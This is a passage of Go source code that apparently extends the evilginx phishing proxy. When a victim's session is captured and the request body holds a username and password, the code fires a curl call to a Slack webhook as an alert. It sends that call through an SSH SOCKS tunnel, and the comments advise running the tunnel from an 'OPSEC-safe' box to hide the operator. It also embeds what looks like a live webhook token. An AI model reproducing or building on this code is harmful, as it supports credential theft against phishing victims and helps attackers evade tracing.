			...
			if phished {
				...
				if pl != nil && ps.SessionId != "" {
					...
					if err == nil {
						...
						// Fire a Slack webhook if evilginx catches a session
						// Before running evilginx, set up a proxy
						// You MUST proxy through an OPSEC-SAFE box
						// ...so first run: nohup ssh -N -D 40034 user@opsec_safe.com &
						// You may want to first test the ssh session works fine:
						// ssh user@opsec_safe
						// ...just to see if you need to accept a new hostkey, etc
						
						bod := string(body)
						if strings.Contains(bod, "username"){
							if strings.Contains(bod, "password"){
								cmd := exec.Command("curl", "-x", "socks5h://0:43004", "https://hooks.slack.com/workflows/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")
								//cmd := exec.Command("curl", "https://hooks.slack.com/workflows/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")
								cmd.Run()
								//if err != nil {
								//	log.Fatal(err)
								//}
